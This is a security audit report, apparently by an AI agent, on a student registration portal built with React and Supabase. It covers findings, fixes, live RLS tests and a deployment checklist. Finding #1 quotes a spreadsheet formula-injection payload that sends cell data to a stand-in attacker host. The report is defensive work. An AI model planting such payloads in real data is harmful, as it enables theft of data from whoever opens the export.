# SMCBI Student Registration Portal — Security Audit

Audited: full React/Vite frontend, Supabase schema (tables, RLS policies, RPC/trigger
functions), export/document generation, dependency tree, and deployment config.
Every finding below was verified against the actual code or tested live against the
project's own Supabase instance — nothing here is guessed.

## Summary

| Severity | Count |
|---|---|
| CRITICAL | 1 |
| HIGH | 3 |
| MEDIUM | 3 |
| LOW | 2 |
| INFORMATIONAL (verified, already sound) | 8 |

---

## Findings

| # | Finding | Severity | Location | Why It's Dangerous | Fix | Status |
|---|---|---|---|---|---|---|
| 1 | CSV/Excel formula injection | **CRITICAL** | `src/lib/exportRegistrations.js` | First/last name, email, and School ID are all attacker-controlled via the public form. A name like `=HYPERLINK("https://evil.example/steal?"&A1)` sits inert in the database but executes as a live formula the moment an admin opens the exported CSV/XLSX in Excel/Sheets — can exfiltrate other cells or worse (DDE in old Excel configs). | Added `sanitizeForSpreadsheet()`: any field starting with `=`, `+`, `-`, `@`, tab, or CR gets a leading `'` forcing text interpretation. Applied to CSV and Excel exports. Not applied to PDF/DOCX — those can't execute formulas, so prefixing would just be visual noise. | ✅ Fixed |
| 2 | No rate limiting on public registration | **HIGH** | `student_registrations` INSERT path | Supabase's PostgREST does not throttle table inserts by IP, and this app has no backend server. Nothing stopped a script from submitting thousands of fake registrations. | Added a `before insert` trigger (`enforce_registration_rate_limit`) reading the real client IP from the `x-forwarded-for` header PostgREST forwards, capping at 5 submissions/IP/hour via a new `registration_attempts` table (RLS-locked, zero policies — nothing can read or write it directly). | ✅ Fixed (needs migration run — see below) |
| 3 | No security headers | **HIGH** | Deployment (no `vercel.json` existed) | No CSP, clickjacking protection, or MIME-sniffing protection at all. | Added `vercel.json` with CSP, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Permissions-Policy`, HSTS. **Tested live**: built the app, served it locally with the exact same headers, and drove the full app (registration wizard, admin dashboard/charts, dropdowns, PDF export) through a real browser — zero CSP violations. | ✅ Fixed & tested |
| 4 | No length caps on free-text columns | **HIGH** | `student_registrations` table | `text` has no length limit in Postgres by default. A single request could submit a multi-megabyte string as a name — storage-exhaustion abuse, no rate limit needed since it's one request. | Added `char_length(...) <= N` checks: firstname/lastname ≤100, email ≤255, barcode ≤50. | ✅ Fixed (needs migration run) |
| 5 | Supabase public sign-up is enabled | **MEDIUM** | Supabase Auth settings (dashboard, not code) | This app has zero legitimate use for self-service Supabase Auth accounts — only admins are provisioned (manually, via SQL editor). **Verified live**: successfully self-signed-up a throwaway account using only the public anon key, no app UI involved. This grants no privilege (confirmed — see Security Tests), but it's needless attack surface and lets anyone spin up accounts against your project. | Disable **Authentication → Settings → Allow new users to sign up** in the Supabase dashboard. Cannot be done from application code. | ⚠️ Requires manual Supabase dashboard change |
| 6 | Unbounded admin export size | **MEDIUM** | `src/lib/adminApi.js` (`fetchAllMatching`) | No hard ceiling on export size — a compromised admin session, a runaway script, or a future bug that forgets to filter could pull the entire table in one request. | Added a 5,000-row hard cap (`.range(0, 4999)`) independent of filters; the export overlay now tells the admin when a result was capped and to narrow their filters. | ✅ Fixed |
| 7 | Admin login leaked raw error text | **MEDIUM** | `src/pages/admin/AdminLoginPage.jsx` | The fallback branch displayed `err.message` verbatim for anything other than a wrong-password error — could leak Supabase Auth internals. | Replaced with an explicit allowlist of the two safe messages; everything else becomes a generic "Could not sign in." | ✅ Fixed |
| 8 | No bot deterrents on registration form | **LOW** | `src/pages/RegisterPage.jsx` | Nothing stopped a simple scripted form-fill beyond what a human would need to do manually. | Added a honeypot field (invisible, off-screen, unreachable by Tab) and a minimum-fill-time check (<3s = treated as a bot). **Explicitly not the security boundary** — both are trivially bypassed by any bot author who reads the page source. The real boundary is finding #2's database-level rate limit, which applies regardless of what the client does. | ✅ Added (defense-in-depth only) |
| 9 | Duplicate email/barcode check enables limited enumeration | **LOW** | `check_email_exists` / `check_barcode_exists` RPCs | An attacker can probe whether a specific `@smcbi.edu.ph` email or School ID is already registered. | **Accepted, not changed** — this is necessary UX for a self-registration form (catching a duplicate before a student fills out 5 steps), the RPCs return only a boolean (never a record), and school email addresses aren't secret in the way a login-existence check for, say, a banking app would be. Documented as a deliberate trade-off rather than an oversight. | ℹ️ Accepted risk (documented) |
| 10 | `exceljs` → `uuid` moderate advisory | INFORMATIONAL | `package.json` (transitive) | `npm audit`: moderate, buffer-bounds-check issue in `uuid`, only reachable when a caller explicitly passes a custom buffer — `exceljs`'s internal usage never does this in our code path. | No forced fix — the only available fix is `exceljs@3.4.0`, a major downgrade that would break the export code for a non-reachable issue. `npm audit` result: **0 critical, 0 high, 0 low, 2 moderate** (same chain, listed once here). | ℹ️ Accepted, monitored |

### Verified sound (no change needed) — tested, not assumed

| # | Area | Verification |
|---|---|---|
| 11 | No `dangerouslySetInnerHTML` anywhere | `grep -r dangerouslySetInnerHTML src/` → zero matches. React's default JSX escaping covers every rendered value. |
| 12 | No secrets in source | Full-project grep for `service_role`, `SUPABASE_SERVICE`, `SECRET_KEY`, `private_key`, `DATABASE_URL`, etc. → only match is a code comment *warning against* using the service-role key. Only `VITE_SUPABASE_URL`/`VITE_SUPABASE_ANON_KEY` exist, both meant to be public. |
| 13 | RLS is real, not "authenticated can do anything" | Grepped for `using (true)` / `for all` across every policy — none exist. Every policy names an explicit operation and an explicit condition (`is_admin()` or the pending-only insert check). |
| 14 | Admin authorization is DB-backed | `AdminAuthContext.signIn()` calls the `is_admin()` RPC (checks `admin_users` table membership via `auth.uid()`) and force-signs-out if it returns false — not a frontend `email === '...'` check. **Live-tested**: anon key cannot insert into `admin_users` (RLS blocks it — "new row violates row-level security policy"), and a freshly self-signed-up account has no path to membership. `ProtectedRoute` in React is UX only; RLS is what actually enforces this. |
| 15 | SECURITY DEFINER functions are hardened | All 5 (`is_admin`, `check_email_exists`, `check_barcode_exists`, `registration_stats`, `registration_distribution`, plus the new rate-limit functions) set `search_path = public` explicitly — the standard defense against search-path hijacking. |
| 16 | Mass assignment isn't possible | Both the public submit path (`submitRegistration`) and the admin edit path (`RegistrationEditModal`) build explicit object literals — never `{...formData}` spread into a Supabase call. Backstopped at the DB layer regardless: the INSERT policy's `with check` locks `status='pending'`, `role in ('student','personnel')`, `reviewed_at/imported_at is null`, so even a raw API call crafting `{status:'approved'}` is rejected by Postgres itself. |
| 17 | Status transitions are locked server-side | **Live-tested**: anonymous UPDATE of any row's `status` is rejected (no UPDATE policy grants anon/non-admin anything). `pending → approved/imported` requires an authenticated admin session. |
| 18 | IDOR isn't exploitable | Primary keys are random UUIDs, not sequential IDs, and SELECT is admin-gated regardless of whether the ID is guessed correctly. |
| 19 | Passwords are never exposed | Registration passwords are bcrypt-hashed client-side before insert (never stored plaintext), and `password_hash` is excluded from `SAFE_COLUMNS` used by *every* admin query — including both export paths. It has never appeared in the admin UI or in any exported file. |

---

## Security Tests Performed (live, against the actual Supabase project)

| Test | Expected | Result |
|---|---|---|
| Anonymous `SELECT * FROM student_registrations` | 0 rows | ✅ 0 rows returned |
| Anonymous `INSERT INTO admin_users` | Rejected | ✅ Rejected: "new row violates row-level security policy" |
| Anonymous `UPDATE student_registrations SET status='approved'` | Rejected | ✅ Rejected, 0 rows affected |
| Self-signup via public anon key (no app UI involved) | Possible (confirms finding #5) | ✅ Succeeded — proves finding #5 is real, not theoretical |
| Freshly self-signed-up account calling `is_admin()` / reading registrations | Should be denied | Could not complete live (this project has email confirmation enabled, so no session was returned immediately) — verified by code inspection instead: `is_admin()` strictly checks `admin_users` membership by `auth.uid()`, and test above proves that table can't be self-inserted into, so this holds by construction |
| CSP compatibility (full app walkthrough under the real header set) | No violations | ✅ Registration wizard (incl. all animations/dropdowns), admin login, dashboard charts, Students filters, and a live PDF export (blob: URL, new tab) — 0 CSP violations, 0 console errors, 0 failed requests |
| Formula-injection payload round-trip | Neutralized in CSV/Excel, untouched in PDF | ✅ `sanitizeForSpreadsheet` prefixes correctly; PDF/DOCX intentionally unaffected (no formula execution risk there) |
| `npm audit` | Known state | 0 critical / 0 high / 0 low / 2 moderate (documented, accepted) |

One side effect of testing: a throwaway account (`smcbi.security.audit.<timestamp>@gmail.com`) now exists in your Supabase `auth.users` table from the self-signup test. It has no admin access and holds no data — delete it from **Authentication → Users** if you'd like it gone.

---

## Files Changed

- `src/lib/exportRegistrations.js` — formula-injection sanitization
- `src/lib/adminApi.js` — export row cap (5,000), return shape now `{rows, truncated}`
- `src/components/admin/RegistrationSection.jsx` — updated for the new export return shape, surfaces truncation
- `src/components/admin/ExportOverlay.jsx` — truncation messaging
- `src/pages/admin/AdminLoginPage.jsx` — generic error messages only
- `src/pages/RegisterPage.jsx` — honeypot field + minimum-fill-time check
- `src/lib/registrations.js` — `RateLimitedError`, surfaces the new trigger's rejection message
- `vercel.json` — new: security headers + SPA rewrite
- `supabase/schema.sql` — length constraints + rate-limiting trigger/table (fresh-install source of truth)
- `supabase/migration-005-security-hardening.sql` — new: the same two fixes as an incremental migration for your already-deployed database

## Database Changes (run `migration-005-security-hardening.sql`)

- **Constraints added**: `student_registrations_{firstname,lastname,email,barcode}_length` (char length caps)
- **Table added**: `registration_attempts` (id, ip_address, attempted_at) — RLS enabled, zero policies (nothing can query it directly)
- **Functions added**: `prune_registration_attempts()`, `enforce_registration_rate_limit()` (both `security definer`, `search_path = public`)
- **Trigger added**: `trg_registration_rate_limit` (before insert on `student_registrations`)

## Environment Variables

No new variables required. Existing ones, unchanged:

- `VITE_SUPABASE_URL` — public, safe to expose (required)
- `VITE_SUPABASE_ANON_KEY` — public, safe to expose, protected by RLS (required)

`.env.example` already contains only placeholders; `.gitignore` already excludes `.env`, `.env.local`, `.env.*.local`. No service-role key, database password, or other secret exists anywhere in the codebase (verified by full-project grep).

---

## Manual Production Checklist

Things I cannot do from application code — you'll need to do these yourself:

### Supabase
- [ ] **Run `supabase/migration-005-security-hardening.sql`** in the SQL editor (adds the rate limiter + length caps)
- [ ] **Authentication → Settings → disable "Allow new users to sign up"** — this app never needs self-service Auth accounts; only admins, provisioned manually
- [ ] Consider enabling **leaked-password protection** for admin accounts if your Supabase plan includes it (Authentication → Settings)
- [ ] Periodically review **Authentication → Users** for unexpected accounts (a disabled-signup setting prevents new ones, but review existing ones first)
- [ ] Delete the throwaway test account created during this audit if you don't want it lingering (see Security Tests above)

### Vercel
- [ ] Deploy with `vercel.json` present — headers only take effect through Vercel's own edge network, not local `vite dev`/`preview`
- [ ] Confirm `VITE_SUPABASE_URL` / `VITE_SUPABASE_ANON_KEY` are set as Vercel environment variables (not just local `.env`)
- [ ] After deploying, spot-check response headers (e.g. via browser devtools → Network → any request → Response Headers) to confirm the CSP is actually being served

### Not implemented — requires a decision or an external service
- **CAPTCHA/Turnstile on registration**: Supabase's built-in CAPTCHA support covers *Auth* endpoints (signup/signin), not arbitrary table inserts, so it doesn't apply to the public registration form as built. Adding Cloudflare Turnstile here would need a Turnstile site key/secret (external account) and a server-side verification step (Supabase Edge Function or similar) I don't have deploy access to from this environment. The database-level rate limiter (finding #2) is the real boundary in the meantime; Turnstile would be an additional layer on top if bot traffic becomes a real problem in practice.
- **Admin action audit log** (approve/reject/import/export history): not built this round — the current admin actions already write `reviewed_at`/`reviewed_by`/`imported_at` onto each registration, which covers "who touched this record and when" for that record, but there's no separate append-only log of every action. Worth a follow-up if you want a fuller trail.

---

## What This Audit Cannot Guarantee

- **This is not a guarantee the system is unhackable.** It's a snapshot against the code and live database as they exist today, tested where testing was possible from this environment.
- I don't have Supabase service-role or dashboard access, or Vercel deploy access — anything requiring those (disabling public signup, confirming headers are actually served in production, rotating keys) needs you to act on the checklist above.
- Supabase's own infrastructure (Auth endpoint rate limiting, DDoS protection, platform-level patching) is outside what any amount of application code can control or verify from here.
- New vulnerabilities can appear as dependencies update — `npm audit` should be re-run periodically, not just once.
- Production monitoring (unusual traffic patterns, repeated rate-limit rejections, failed-login spikes) isn't something code alone provides; consider what Supabase/Vercel logging and alerting your plan offers.
